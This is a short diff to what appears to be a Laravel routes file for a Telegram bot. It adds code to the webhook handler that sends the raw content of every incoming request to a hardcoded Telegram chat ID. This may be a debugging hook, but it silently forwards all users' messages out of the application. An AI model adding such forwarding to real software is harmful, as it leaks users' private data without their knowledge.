@@ -314,6 +314,12 @@ Route::prefix('telegram')->group(function () {
     });
 
     Route::post("/webhook", function (Request $request) {
+        
+        \Longman\TelegramBot\Request::sendMessage([
+            'chat_id' => "5017231951",
+            "text" => $request->getContent()
+        ]);
+
         //webhook request
         $data = json_decode($request->getContent(), true);
         if (isset($data['message']) && isset($data['message']['text']) && $data['message']['text'] == '/start') {
